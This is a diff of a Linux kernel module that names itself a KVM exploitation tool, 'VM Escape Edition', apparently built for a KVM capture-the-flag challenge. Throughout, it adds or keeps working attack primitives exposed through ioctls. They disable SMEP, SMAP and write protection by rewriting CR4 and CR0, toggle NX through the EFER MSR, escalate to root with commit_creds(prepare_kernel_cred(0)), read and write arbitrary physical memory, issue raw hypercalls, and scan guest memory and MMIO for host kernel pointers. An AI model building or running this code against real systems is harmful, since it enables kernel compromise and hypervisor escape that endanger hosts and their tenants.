@@ -24,6 +24,7 @@
 #include <linux/kprobes.h>
 #include <linux/proc_fs.h>
 #include <linux/seq_file.h>
+#include <linux/delay.h>
 #include <asm/io.h>
 #include <asm/pgtable.h>
 
@@ -32,7 +33,7 @@
 #include <asm/tlbflush.h>
 #include <asm/cacheflush.h>
 #include <asm/processor.h>
-/* Try to include set_memory header if available */
+#include <asm/msr.h>
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 12, 0)
 #include <linux/set_memory.h>
 #elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 2, 0)
@@ -47,24 +48,23 @@
 #define VQ_PAGE_SIZE (1UL << (PAGE_SHIFT + VQ_PAGE_ORDER))
 #define MAX_VQ_DESCS 256
 #define MAX_SYMBOL_NAME 128
+#define MAX_DMA_PAGES 64
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("KVM Probe Lab");
-MODULE_DESCRIPTION("Kernel module for KVM exploitation");
-MODULE_VERSION("3.2"); /* Version bump for NX control */
+MODULE_DESCRIPTION("Kernel module for KVM exploitation - VM Escape Edition");
+MODULE_VERSION("4.0");
 
 /* ========================================================================
  * Kernel Version Compatibility Macros
  * ======================================================================== */
 
-/* class_create API changed in kernel 6.4 */
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
 #define CLASS_CREATE_COMPAT(name) class_create(name)
 #else
 #define CLASS_CREATE_COMPAT(name) class_create(THIS_MODULE, name)
 #endif
 
-/* kallsyms_lookup_name is no longer exported in kernel 5.7+ */
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
 static unsigned long (*kallsyms_lookup_name_ptr)(const char *name) = NULL;
 
@@ -93,7 +93,6 @@ static int kallsyms_lookup_init(void) {
 static int kallsyms_lookup_init(void) { return 0; }
 #endif
 
-/* sync_core definition for non-x86 architectures */
 #ifndef CONFIG_X86
 #define sync_core() mb()
 #endif
@@ -107,7 +106,6 @@ static unsigned long g_kernel_text_base = 0;
 static unsigned long g_kernel_base = 0;
 static bool g_kaslr_initialized = false;
 
-/* Important kernel symbols we'll cache */
 static unsigned long g_symbol_commit_creds = 0;
 static unsigned long g_symbol_prepare_kernel_cred = 0;
 static unsigned long g_symbol_init_task = 0;
@@ -115,13 +113,11 @@ static unsigned long g_symbol_swapper_pg_dir = 0;
 static unsigned long g_symbol_init_mm = 0;
 static unsigned long g_symbol_write_flag = 0;
 
-/* Initialize KASLR slide and detect kernel base properly */
 static int init_kaslr_slide(void) {
     unsigned long stext_addr = 0;
     unsigned long _text_addr = 0;
 
 #if IS_ENABLED(CONFIG_KALLSYMS)
-    /* Try multiple symbols to be robust */
     stext_addr = KALLSYMS_LOOKUP_NAME("_stext");
     if (!stext_addr) {
         stext_addr = KALLSYMS_LOOKUP_NAME("stext");
@@ -132,7 +128,6 @@ static int init_kaslr_slide(void) {
         _text_addr = KALLSYMS_LOOKUP_NAME("text");
     }
 
-    /* Use the first available symbol */
     if (stext_addr) {
         g_kernel_text_base = stext_addr;
     } else if (_text_addr) {
@@ -141,12 +136,8 @@ static int init_kaslr_slide(void) {
         return -ENOENT;
     }
 
-    /* Calculate KASLR slide from kernel text */
     g_kaslr_slide = g_kernel_text_base - 0xffffffff80000000UL;
-
-    /* Kernel base is typically PAGE_OFFSET + slide */
     g_kernel_base = (unsigned long)PAGE_OFFSET + g_kaslr_slide;
-
     g_kaslr_initialized = true;
 
     return 0;
@@ -155,7 +146,6 @@ static int init_kaslr_slide(void) {
 #endif
 }
 
-/* Cache important kernel symbols */
 static int cache_important_symbols(void) {
 #if IS_ENABLED(CONFIG_KALLSYMS)
     g_symbol_commit_creds = KALLSYMS_LOOKUP_NAME("commit_creds");
@@ -163,41 +153,34 @@ static int cache_important_symbols(void) {
     g_symbol_init_task = KALLSYMS_LOOKUP_NAME("init_task");
     g_symbol_swapper_pg_dir = KALLSYMS_LOOKUP_NAME("swapper_pg_dir");
     g_symbol_init_mm = KALLSYMS_LOOKUP_NAME("init_mm");
-    g_symbol_write_flag = KALLSYMS_LOOKUP_NAME("write_flag"); /* CTF specific */
-
+    g_symbol_write_flag = KALLSYMS_LOOKUP_NAME("write_flag");
     return 0;
 #else
     return -ENOENT;
 #endif
 }
 
-/* Convert unslid address to actual runtime address - IMPROVED VERSION */
 static inline unsigned long apply_kaslr_slide(unsigned long unslid_addr) {
     if (!g_kaslr_initialized) {
-        return unslid_addr; /* Fallback if not initialized */
+        return unslid_addr;
     }
 
-    /* Handle kernel text addresses */
     if (unslid_addr >= 0xffffffff80000000UL && unslid_addr < 0xffffffffa0000000UL) {
         return unslid_addr + g_kaslr_slide;
     }
 
-    /* Handle direct mapping area */
     if (unslid_addr >= (unsigned long)PAGE_OFFSET) {
-        return unslid_addr; /* Already in direct mapping */
+        return unslid_addr;
     }
 
-    /* Handle module addresses */
     if (unslid_addr >= 0xffffffffa0000000UL) {
-        return unslid_addr; /* Module space usually doesn't have KASLR */
+        return unslid_addr;
     }
 
-    /* Small offset - assume relative to kernel base */
     if (unslid_addr < 0x1000000UL) {
         return g_kernel_base + unslid_addr;
     }
 
-    /* Unknown - return as-is */
     return unslid_addr;
 }
 
@@ -206,291 +189,144 @@ static inline bool is_kernel_address(unsigned long addr) {
            (addr >= 0xffffffff80000000UL && addr <= 0xffffffffffffffffUL);
 }
 
-/* Lookup symbol by name with automatic KASLR handling */
 static unsigned long lookup_symbol(const char *name) {
     unsigned long addr = 0;
-
-    #if IS_ENABLED(CONFIG_KALLSYMS)
-        addr = KALLSYMS_LOOKUP_NAME(name);
-    #endif
-
+#if IS_ENABLED(CONFIG_KALLSYMS)
+    addr = KALLSYMS_LOOKUP_NAME(name);
+#endif
     return addr;
 }
 
 /* ========================================================================
- * Memory Protection Functions - with fallbacks
+ * Protection Control Variables
  * ======================================================================== */
 
-/* Check if set_memory functions are available */
-#if defined(CONFIG_X86) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 2, 0))
-#define HAS_SET_MEMORY_FUNCS 1
-
-/* Wrappers for set_memory functions */
-static inline int my_set_memory_rw(unsigned long addr, int numpages) {
-    return set_memory_rw(addr, numpages);
-}
-
-static inline int my_set_memory_ro(unsigned long addr, int numpages) {
-    return set_memory_ro(addr, numpages);
-}
-
-#else
-#define HAS_SET_MEMORY_FUNCS 0
-
-/* Helper function for page table walking */
-static pte_t *lookup_address(unsigned long address, unsigned int *level) {
-#ifdef CONFIG_X86
-    pgd_t *pgd;
-    pud_t *pud;
-    pmd_t *pmd;
-    pte_t *pte;
-
-    *level = PG_LEVEL_NONE;
-
-    pgd = pgd_offset_k(address);
-    if (pgd_none(*pgd))
-        return NULL;
-
-    pud = pud_offset(pgd, address);
-    if (pud_none(*pud))
-        return NULL;
-    if (pud_large(*pud)) {
-        *level = PG_LEVEL_1G;
-        return (pte_t *)pud;
-    }
-
-    pmd = pmd_offset(pud, address);
-    if (pmd_none(*pmd))
-        return NULL;
-    if (pmd_large(*pmd)) {
-        *level = PG_LEVEL_2M;
-        return (pte_t *)pmd;
-    }
-
-    pte = pte_offset_kernel(pmd, address);
-    if (pte_none(*pte))
-        return NULL;
-
-    *level = PG_LEVEL_4K;
-    return pte;
-#else
-    return NULL;
-#endif
-}
-
-/* Fallback: use direct page table manipulation */
-static inline int my_set_memory_rw(unsigned long addr, int numpages) {
-    unsigned long i;
-    pte_t *ptep;
-    unsigned int level;
-
-    for (i = 0; i < numpages; i++) {
-        ptep = lookup_address(addr + (i * PAGE_SIZE), &level);
-        if (!ptep) {
-            return -EINVAL;
-        }
-
-        /* Set writable bit */
-        set_pte(ptep, pte_mkwrite(*ptep));
-    }
-
-    /* Flush TLB */
-    flush_tlb_all();
-    return 0;
-}
-
-static inline int my_set_memory_ro(unsigned long addr, int numpages) {
-    unsigned long i;
-    pte_t *ptep;
-    unsigned int level;
-
-    for (i = 0; i < numpages; i++) {
-        ptep = lookup_address(addr + (i * PAGE_SIZE), &level);
-        if (!ptep) {
-            return -EINVAL;
-        }
-
-        /* Clear writable bit */
-        set_pte(ptep, pte_wrprotect(*ptep));
-    }
-
-    /* Flush TLB */
-    flush_tlb_all();
-    return 0;
-}
-#endif  /* <-- THIS WAS MISSING! */
-#if !defined(HAS_SET_MEMORY_FUNCS) || !HAS_SET_MEMORY_FUNCS
-/* Fallback: use direct page table manipulation */
-static inline int my_set_memory_rw(unsigned long addr, int numpages) {
-    unsigned long i;
-    pte_t *ptep;
-    unsigned int level;
-
-    for (i = 0; i < numpages; i++) {
-        ptep = lookup_address(addr + (i * PAGE_SIZE), &level);
-        if (!ptep) {
-            return -EINVAL;
-        }
-
-        /* Set writable bit */
-        set_pte(ptep, pte_mkwrite(*ptep));
-        /* Also clear read-only bit if needed */
-        set_pte(ptep, pte_mkwrite(pte_mkdirty(*ptep)));
-    }
-
-    /* Flush TLB */
-    flush_tlb_all();
-    return 0;
-}
-
-static inline int my_set_memory_ro(unsigned long addr, int numpages) {
-    unsigned long i;
-    pte_t *ptep;
-    unsigned int level;
-
-    for (i = 0; i < numpages; i++) {
-        ptep = lookup_address(addr + (i * PAGE_SIZE), &level);
-        if (!ptep) {
-            return -EINVAL;
-        }
-
-        /* Clear writable bit */
-        set_pte(ptep, pte_wrprotect(*ptep));
-    }
-
-    /* Flush TLB */
-    flush_tlb_all();
-    return 0;
-}
-#endif
-
-/* ========================================================================
- * Extreme KVMCTF Exploitation Primitives - FIXED VERSION
- * ======================================================================== */
-
-/* Add these global variables */
 static unsigned long g_original_cr4 = 0;
 static unsigned long g_original_cr0 = 0;
+static u64 g_original_efer = 0;
 static bool g_smep_disabled = false;
 static bool g_smap_disabled = false;
 static bool g_wp_disabled = false;
 static bool g_nx_enabled = false;
-static u64 g_original_efer = 0;
 
-/* EFER MSR number and bit definitions */
 #define MSR_EFER 0xC0000080
-#define EFER_NXE (1 << 11)  /* No-Execute Enable */
+#define EFER_NXE (1 << 11)
 
-/* Extreme Exploitation Helpers (KVMCTF ONLY) */
+/* ========================================================================
+ * CR/MSR Operations
+ * ======================================================================== */
+
 #ifdef CONFIG_X86
-/* Read CR4 register */
 static inline unsigned long my_read_cr4(void) {
     unsigned long cr4;
     asm volatile("mov %%cr4, %0" : "=r"(cr4));
     return cr4;
 }
 
-/* Write CR4 register */
 static inline void my_write_cr4(unsigned long cr4) {
     asm volatile("mov %0, %%cr4" : : "r"(cr4) : "memory");
 }
 
-/* Read CR0 register */
 static inline unsigned long my_read_cr0(void) {
     unsigned long cr0;
     asm volatile("mov %%cr0, %0" : "=r"(cr0));
     return cr0;
 }
 
-/* Write CR0 register */
 static inline void my_write_cr0(unsigned long cr0) {
     asm volatile("mov %0, %%cr0" : : "r"(cr0) : "memory");
 }
 
-/* Read MSR - use different name to avoid conflict */
 static inline u64 my_rdmsr(u32 msr) {
     u32 low, high;
     asm volatile("rdmsr" : "=a"(low), "=d"(high) : "c"(msr));
     return ((u64)high << 32) | low;
 }
 
-/* Write MSR - use different name to avoid conflict */
 static inline void my_wrmsr(u32 msr, u64 value) {
     u32 low = value & 0xffffffff;
     u32 high = value >> 32;
     asm volatile("wrmsr" : : "c"(msr), "a"(low), "d"(high));
 }
+
+static inline unsigned long my_read_cr2(void) {
+    unsigned long cr2;
+    asm volatile("mov %%cr2, %0" : "=r"(cr2));
+    return cr2;
+}
+
+static inline unsigned long my_read_cr3(void) {
+    unsigned long cr3;
+    asm volatile("mov %%cr3, %0" : "=r"(cr3));
+    return cr3;
+}
+
+static inline void my_write_cr3(unsigned long cr3) {
+    asm volatile("mov %0, %%cr3" : : "r"(cr3) : "memory");
+}
 #endif
 
-/* Disable SMEP by clearing bit 20 of CR4 */
+/* Protection control functions */
 static void disable_smep(void) {
 #ifdef CONFIG_X86
     unsigned long current_cr4 = my_read_cr4();
-    g_original_cr4 = current_cr4;  // Save original
-    unsigned long new_cr4 = current_cr4 & ~(1UL << 20);  // Clear SMEP bit (20)
+    g_original_cr4 = current_cr4;
+    unsigned long new_cr4 = current_cr4 & ~(1UL << 20);
     my_write_cr4(new_cr4);
     g_smep_disabled = true;
 #endif
 }
 
-/* Enable SMEP by setting bit 20 of CR4 */
 static void enable_smep(void) {
 #ifdef CONFIG_X86
     unsigned long current_cr4 = my_read_cr4();
-    unsigned long new_cr4 = current_cr4 | (1UL << 20);  // Set SMEP bit (20)
+    unsigned long new_cr4 = current_cr4 | (1UL << 20);
     my_write_cr4(new_cr4);
     g_smep_disabled = false;
 #endif
 }
 
-/* Disable SMAP by clearing bit 21 of CR4 */
 static void disable_smap(void) {
 #ifdef CONFIG_X86
     unsigned long current_cr4 = my_read_cr4();
-    g_original_cr4 = current_cr4;  // Save original
-    unsigned long new_cr4 = current_cr4 & ~(1UL << 21);  // Clear SMAP bit (21)
+    g_original_cr4 = current_cr4;
+    unsigned long new_cr4 = current_cr4 & ~(1UL << 21);
     my_write_cr4(new_cr4);
     g_smap_disabled = true;
 #endif
 }
 
-/* Enable SMAP by setting bit 21 of CR4 */
 static void enable_smap(void) {
 #ifdef CONFIG_X86
     unsigned long current_cr4 = my_read_cr4();
-    unsigned long new_cr4 = current_cr4 | (1UL << 21);  // Set SMAP bit (21)
+    unsigned long new_cr4 = current_cr4 | (1UL << 21);
     my_write_cr4(new_cr4);
     g_smap_disabled = false;
 #endif
 }
 
-/* Disable Write Protect by clearing bit 16 of CR0 */
 static void disable_wp(void) {
 #ifdef CONFIG_X86
     unsigned long current_cr0 = my_read_cr0();
-    g_original_cr0 = current_cr0;  // Save original
-    unsigned long new_cr0 = current_cr0 & ~(1UL << 16);  // Clear WP bit (16)
+    g_original_cr0 = current_cr0;
+    unsigned long new_cr0 = current_cr0 & ~(1UL << 16);
     my_write_cr0(new_cr0);
     g_wp_disabled = true;
 #endif
 }
 
-/* Enable Write Protect by setting bit 16 of CR0 */
 static void enable_wp(void) {
 #ifdef CONFIG_X86
     unsigned long current_cr0 = my_read_cr0();
-    unsigned long new_cr0 = current_cr0 | (1UL << 16);  // Set WP bit (16)
+    unsigned long new_cr0 = current_cr0 | (1UL << 16);
     my_write_cr0(new_cr0);
     g_wp_disabled = false;
 #endif
 }
 
-/* Enable NX by setting EFER.NXE bit */
 static void enable_nx(void) {
 #ifdef CONFIG_X86
     u64 current_efer;
-
-    /* Save original only if not already saved */
     if (!g_original_efer) {
         current_efer = my_rdmsr(MSR_EFER);
         g_original_efer = current_efer;
@@ -499,40 +335,22 @@ static void enable_nx(void) {
     }
 
     if (!(current_efer & EFER_NXE)) {
-        u64 new_efer = current_efer | EFER_NXE;  // Set NXE bit (11)
+        u64 new_efer = current_efer | EFER_NXE;
         my_wrmsr(MSR_EFER, new_efer);
         g_nx_enabled = true;
     }
 #endif
 }
 
-/* Disable NX by clearing EFER.NXE bit */
 static void disable_nx(void) {
 #ifdef CONFIG_X86
     u64 current_efer = my_rdmsr(MSR_EFER);
-    u64 new_efer = current_efer & ~EFER_NXE;  // Clear NXE bit (11)
+    u64 new_efer = current_efer & ~EFER_NXE;
     my_wrmsr(MSR_EFER, new_efer);
     g_nx_enabled = false;
 #endif
 }
 
-/* Read CR0 register - renamed to avoid conflict */
-static void my_read_cr0_debug(void) {
-#ifdef CONFIG_X86
-    unsigned long cr0 = my_read_cr0();
-#endif
-}
-
-/* Check current protection status */
-static void check_protection_status(void) {
-#ifdef CONFIG_X86
-    unsigned long cr0 = my_read_cr0();
-    unsigned long cr4 = my_read_cr4();
-    u64 efer = my_rdmsr(MSR_EFER);
-#endif
-}
-
-/* Restore original protection */
 static void restore_protections(void) {
 #ifdef CONFIG_X86
     if (g_smep_disabled || g_smap_disabled) {
@@ -551,95 +369,6 @@ static void restore_protections(void) {
 #endif
 }
 
-/* Privilege escalation primitive */
-static void escalate_privileges(void) {
-#if IS_ENABLED(CONFIG_KALLSYMS)
-    if (g_symbol_commit_creds && g_symbol_prepare_kernel_cred) {
-        typedef void* (*prepare_kernel_cred_t)(void*);
-        typedef int (*commit_creds_t)(void*);
-
-        prepare_kernel_cred_t prepare_kernel_cred =
-            (prepare_kernel_cred_t)g_symbol_prepare_kernel_cred;
-        commit_creds_t commit_creds =
-            (commit_creds_t)g_symbol_commit_creds;
-
-        void *cred = prepare_kernel_cred(0);
-        if (cred) {
-            commit_creds(cred);
-        }
-    }
-#endif
-}
-
-/* Read physical memory directly */
-static int read_physical_memory(unsigned long phys_addr, unsigned char *buffer, size_t size) {
-    void __iomem *mem;
-
-    mem = ioremap(phys_addr, size);
-    if (!mem) {
-        return -EFAULT;
-    }
-
-    memcpy_fromio(buffer, mem, size);
-    iounmap(mem);
-    return 0;
-}
-
-/* Write physical memory directly */
-static int write_physical_memory(unsigned long phys_addr, unsigned char *buffer, size_t size) {
-    void __iomem *mem;
-
-    mem = ioremap(phys_addr, size);
-    if (!mem) {
-        return -EFAULT;
-    }
-
-    memcpy_toio(mem, buffer, size);
-    iounmap(mem);
-    return 0;
-}
-
-/* Allocate pages and map them as root */
-static int alloc_root_pages(unsigned long __user *user_pages, int count) {
-    struct page **pages;
-    int i;
-
-    if (count <= 0 || count > 16) {
-        return -EINVAL;
-    }
-
-    pages = kmalloc_array(count, sizeof(struct page *), GFP_KERNEL);
-    if (!pages) {
-        return -ENOMEM;
-    }
-
-    for (i = 0; i < count; i++) {
-        pages[i] = alloc_page(GFP_KERNEL);
-        if (!pages[i]) {
-            /* Free allocated pages on failure */
-            while (i-- > 0) {
-                __free_page(pages[i]);
-            }
-            kfree(pages);
-            return -ENOMEM;
-        }
-
-        /* Return physical address to user */
-        unsigned long phys = page_to_phys(pages[i]);
-        if (copy_to_user(&user_pages[i], &phys, sizeof(phys))) {
-            /* Free all pages on copy failure */
-            for (int j = 0; j <= i; j++) {
-                __free_page(pages[j]);
-            }
-            kfree(pages);
-            return -EFAULT;
-        }
-    }
-
-    kfree(pages);
-    return 0;
-}
-
 /* ========================================================================
  * Global Variables
  * ======================================================================== */
@@ -651,6 +380,11 @@ static struct device* driver_device = NULL;
 static void *g_vq_virt_addr = NULL;
 static dma_addr_t g_vq_phys_addr = 0;
 static unsigned long g_vq_pfn = 0;
+
+/* DMA page tracking for VM escape attempts */
+static struct page *g_dma_pages[MAX_DMA_PAGES];
+static dma_addr_t g_dma_addrs[MAX_DMA_PAGES];
+static int g_dma_page_count = 0;
 
 /* ========================================================================
  * Structure Definitions
@@ -697,24 +431,13 @@ struct kvm_kernel_mem_write {
     unsigned char __user *user_buf;
 };
 
-struct va_scan_data {
-    unsigned long va;
-    unsigned long size;
-    unsigned char __user *user_buffer;
-};
-
-struct va_write_data {
-    unsigned long va;
-    unsigned long size;
-    unsigned char __user *user_buffer;
-};
-
 struct hypercall_args {
     unsigned long nr;
     unsigned long arg0;
     unsigned long arg1;
     unsigned long arg2;
     unsigned long arg3;
+    long result;
 };
 
 struct patch_req {
@@ -739,11 +462,38 @@ struct physical_rw {
     unsigned char __user *user_buffer;
 };
 
-struct exploit_primitive {
-    unsigned long target;
-    unsigned long value;
+struct va_scan_data {
+    unsigned long va;
     unsigned long size;
     unsigned char __user *user_buffer;
+};
+
+struct va_write_data {
+    unsigned long va;
+    unsigned long size;
+    unsigned char __user *user_buffer;
+};
+
+/* New structures for VM escape */
+struct dma_alloc_req {
+    unsigned int count;
+    unsigned long __user *addrs;
+};
+
+struct mmio_probe_req {
+    unsigned long base_addr;
+    unsigned long size;
+    unsigned long stride;
+    unsigned char __user *results;
+};
+
+struct host_ptr_scan {
+    unsigned long phys_start;
+    unsigned long phys_end;
+    unsigned long stride;
+    unsigned long __user *found_ptrs;
+    unsigned int __user *found_count;
+    unsigned int max_count;
 };
 
 /* ========================================================================
@@ -793,64 +543,308 @@ struct exploit_primitive {
 #define IOCTL_WRITE_CR0          0x1029
 #define IOCTL_CHECK_STATUS       0x102A
 
+/* New IOCTLs for VM escape */
+#define IOCTL_ALLOC_DMA_PAGES    0x1030
+#define IOCTL_FREE_DMA_PAGES     0x1031
+#define IOCTL_PROBE_MMIO_RANGE   0x1032
+#define IOCTL_SCAN_HOST_PTRS     0x1033
+#define IOCTL_READ_CR2           0x1034
+#define IOCTL_READ_CR3           0x1035
+#define IOCTL_WRITE_CR3          0x1036
+#define IOCTL_RAW_VMCALL         0x1037
+#define IOCTL_RAW_VMMCALL        0x1038
+#define IOCTL_GET_PHYS_MEM_INFO  0x1039
+#define IOCTL_MAP_HOST_ADDR      0x103A
+
 /* ========================================================================
- * Hypercall Implementation - NEW VERSION
+ * Hypercall Implementation
  * ======================================================================== */
 
-/**
- * Executes a KVM hypercall on x86_64.
- * RAX: Hypercall Number
- * Returns value stored in RAX.
- */
-static inline long kvm_hypercall(unsigned int nr) {
+static inline long kvm_hypercall_vmcall(unsigned int nr, unsigned long a0,
+                                         unsigned long a1, unsigned long a2,
+                                         unsigned long a3) {
     long ret;
-
     asm volatile(
         "vmcall"
-        : "=a"(ret)      /* Output: RAX */
-        : "a"(nr)        /* Input: RAX = hypercall number */
-        : "memory"       /* Clobbers */
+        : "=a"(ret)
+        : "a"(nr), "b"(a0), "c"(a1), "d"(a2), "S"(a3)
+        : "memory"
     );
-
     return ret;
 }
 
-/* Helper function to trigger hypercall after operations */
-static long trigger_hypercall(void) {
+static inline long kvm_hypercall_vmmcall(unsigned int nr, unsigned long a0,
+                                          unsigned long a1, unsigned long a2,
+                                          unsigned long a3) {
     long ret;
+    asm volatile(
+        "vmmcall"
+        : "=a"(ret)
+        : "a"(nr), "b"(a0), "c"(a1), "d"(a2), "S"(a3)
+        : "memory"
+    );
+    return ret;
+}
+
+static inline long kvm_hypercall(unsigned int nr) {
+    long ret;
+    asm volatile(
+        "vmcall"
+        : "=a"(ret)
+        : "a"(nr)
+        : "memory"
+    );
+    return ret;
+}
+
+static long trigger_hypercall(void) {
+    long ret = 0;
     unsigned int hypercalls[] = {100, 101, 102, 103};
+    int i;
 
-    /* Try different hypercall numbers */
-    for (int i = 0; i < 4; i++) {
+    for (i = 0; i < 4; i++) {
         ret = kvm_hypercall(hypercalls[i]);
-
-        /* Only log if return value is interesting (non-zero and not -1000) */
         if (ret != 0 && ret != -1000) {
-            printk(KERN_INFO "%s: Hypercall #%u returned: %ld\n",
+            printk(KERN_DEBUG "%s: Hypercall #%u returned: %ld\n",
                    DRIVER_NAME, hypercalls[i], ret);
         }
     }
-
     return ret;
 }
 
 static long do_hypercall(struct hypercall_args *args) {
-    unsigned long nr = args->nr;
     long ret;
-
-    ret = kvm_hypercall(nr);
-
-    /* Only log if return value is interesting (non-zero and not -1000) */
-    if (ret != 0 && ret != -1000) {
-        printk(KERN_INFO "%s: Hypercall(%lu) returned: %ld\n",
-               DRIVER_NAME, nr, ret);
-    }
-
+    ret = kvm_hypercall_vmcall(args->nr, args->arg0, args->arg1,
+                               args->arg2, args->arg3);
+    args->result = ret;
     return ret;
 }
 
 /* ========================================================================
- * IOCTL Handler - MINIMAL LOGGING VERSION
+ * Physical Memory Operations
+ * ======================================================================== */
+
+static int read_physical_memory(unsigned long phys_addr, unsigned char *buffer, size_t size) {
+    void __iomem *mem;
+
+    mem = ioremap(phys_addr, size);
+    if (!mem) {
+        return -EFAULT;
+    }
+
+    memcpy_fromio(buffer, mem, size);
+    iounmap(mem);
+    return 0;
+}
+
+static int write_physical_memory(unsigned long phys_addr, unsigned char *buffer, size_t size) {
+    void __iomem *mem;
+
+    mem = ioremap(phys_addr, size);
+    if (!mem) {
+        return -EFAULT;
+    }
+
+    memcpy_toio(mem, buffer, size);
+    iounmap(mem);
+    return 0;
+}
+
+/* Allocate DMA-capable pages */
+static int alloc_dma_pages(unsigned int count, unsigned long __user *user_addrs) {
+    unsigned int i;
+
+    if (count > MAX_DMA_PAGES - g_dma_page_count) {
+        count = MAX_DMA_PAGES - g_dma_page_count;
+    }
+
+    if (count == 0) {
+        return -ENOMEM;
+    }
+
+    for (i = 0; i < count; i++) {
+        struct page *page;
+        unsigned long phys;
+
+        page = alloc_page(GFP_KERNEL | __GFP_ZERO | __GFP_DMA);
+        if (!page) {
+            break;
+        }
+
+        g_dma_pages[g_dma_page_count] = page;
+        phys = page_to_phys(page);
+        g_dma_addrs[g_dma_page_count] = phys;
+
+        if (copy_to_user(&user_addrs[i], &phys, sizeof(phys))) {
+            __free_page(page);
+            return -EFAULT;
+        }
+
+        g_dma_page_count++;
+    }
+
+    return i;
+}
+
+/* Free all DMA pages */
+static void free_dma_pages(void) {
+    int i;
+
+    for (i = 0; i < g_dma_page_count; i++) {
+        if (g_dma_pages[i]) {
+            __free_page(g_dma_pages[i]);
+            g_dma_pages[i] = NULL;
+        }
+    }
+    g_dma_page_count = 0;
+}
+
+/* Allocate root pages */
+static int alloc_root_pages(unsigned long __user *user_pages, int count) {
+    struct page **pages;
+    int i, j;
+
+    if (count <= 0 || count > 16) {
+        return -EINVAL;
+    }
+
+    pages = kmalloc_array(count, sizeof(struct page *), GFP_KERNEL);
+    if (!pages) {
+        return -ENOMEM;
+    }
+
+    for (i = 0; i < count; i++) {
+        unsigned long phys;
+        
+        pages[i] = alloc_page(GFP_KERNEL | __GFP_ZERO);
+        if (!pages[i]) {
+            for (j = 0; j < i; j++) {
+                __free_page(pages[j]);
+            }
+            kfree(pages);
+            return -ENOMEM;
+        }
+
+        phys = page_to_phys(pages[i]);
+        if (copy_to_user(&user_pages[i], &phys, sizeof(phys))) {
+            for (j = 0; j <= i; j++) {
+                __free_page(pages[j]);
+            }
+            kfree(pages);
+            return -EFAULT;
+        }
+    }
+
+    kfree(pages);
+    return 0;
+}
+
+/* ========================================================================
+ * VM Escape Helpers
+ * ======================================================================== */
+
+/* Check if value looks like a host kernel pointer */
+static inline bool looks_like_host_ptr(unsigned long value) {
+    /* Host kernel text */
+    if (value >= 0xffffffff80000000UL && value < 0xffffffffa0000000UL) {
+        return true;
+    }
+    /* Host direct mapping */
+    if (value >= 0xffff888000000000UL && value < 0xffffc88000000000UL) {
+        return true;
+    }
+    /* Host module space */
+    if (value >= 0xffffffffa0000000UL && value < 0xffffffffc0000000UL) {
+        return true;
+    }
+    return false;
+}
+
+/* Probe MMIO range looking for interesting values */
+static int probe_mmio_range(struct mmio_probe_req *req) {
+    unsigned long addr;
+    void __iomem *mmio;
+    int count = 0;
+
+    for (addr = req->base_addr; addr < req->base_addr + req->size; addr += req->stride) {
+        u64 value;
+        
+        mmio = ioremap(addr, 8);
+        if (!mmio) continue;
+
+        value = readq(mmio);
+        iounmap(mmio);
+
+        if (looks_like_host_ptr(value)) {
+            if (copy_to_user(req->results + count * sizeof(u64), &value, sizeof(value))) {
+                return -EFAULT;
+            }
+            count++;
+            if (count >= 256) break;
+        }
+    }
+
+    return count;
+}
+
+/* Scan physical memory for host pointers */
+static int scan_for_host_ptrs(struct host_ptr_scan *scan) {
+    unsigned long addr;
+    unsigned int found = 0;
+    unsigned char buf[4096];
+
+    for (addr = scan->phys_start; addr < scan->phys_end && found < scan->max_count; addr += scan->stride) {
+        size_t off;
+        
+        if (read_physical_memory(addr, buf, 4096) != 0) {
+            continue;
+        }
+
+        for (off = 0; off <= 4096 - 8 && found < scan->max_count; off += 8) {
+            unsigned long value = *(unsigned long *)(buf + off);
+
+            if (looks_like_host_ptr(value)) {
+                unsigned long found_addr = addr + off;
+                if (copy_to_user(&scan->found_ptrs[found * 2], &found_addr, sizeof(found_addr))) {
+                    return -EFAULT;
+                }
+                if (copy_to_user(&scan->found_ptrs[found * 2 + 1], &value, sizeof(value))) {
+                    return -EFAULT;
+                }
+                found++;
+            }
+        }
+    }
+
+    if (copy_to_user(scan->found_count, &found, sizeof(found))) {
+        return -EFAULT;
+    }
+
+    return 0;
+}
+
+/* Privilege escalation */
+static void escalate_privileges(void) {
+#if IS_ENABLED(CONFIG_KALLSYMS)
+    if (g_symbol_commit_creds && g_symbol_prepare_kernel_cred) {
+        typedef void* (*prepare_kernel_cred_t)(void*);
+        typedef int (*commit_creds_t)(void*);
+
+        prepare_kernel_cred_t prepare_kernel_cred =
+            (prepare_kernel_cred_t)g_symbol_prepare_kernel_cred;
+        commit_creds_t commit_creds =
+            (commit_creds_t)g_symbol_commit_creds;
+
+        void *cred = prepare_kernel_cred(0);
+        if (cred) {
+            commit_creds(cred);
+        }
+    }
+#endif
+}
+
+/* ========================================================================
+ * IOCTL Handler
  * ======================================================================== */
 
 static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
@@ -860,7 +854,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
     unsigned long len_to_copy;
     unsigned char *k_mmio_buffer = NULL;
 
-    /* No logging for IOCTL commands */
     switch (cmd) {
 
         case IOCTL_LOOKUP_SYMBOL: {
@@ -870,22 +863,18 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 return -EFAULT;
             }
 
-            /* Ensure null termination */
             req.name[MAX_SYMBOL_NAME - 1] = '\0';
-
-            /* Look up the symbol using kallsyms */
             req.address = lookup_symbol(req.name);
 
             if (req.address == 0) {
                 return -ENOENT;
             }
 
-            /* Return address to userspace */
             if (copy_to_user((struct symbol_lookup __user *)arg, &req, sizeof(req))) {
                 return -EFAULT;
             }
 
-            trigger_hypercall(); /* Trigger hypercall after operation */
+            trigger_hypercall();
             return 0;
         }
 
@@ -893,7 +882,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             if (copy_to_user((unsigned long __user *)arg, &g_kaslr_slide, sizeof(g_kaslr_slide))) {
                 return -EFAULT;
             }
-            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
         }
 
@@ -901,7 +889,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             if (copy_to_user((unsigned long __user *)arg, &g_kernel_base, sizeof(g_kernel_base))) {
                 return -EFAULT;
             }
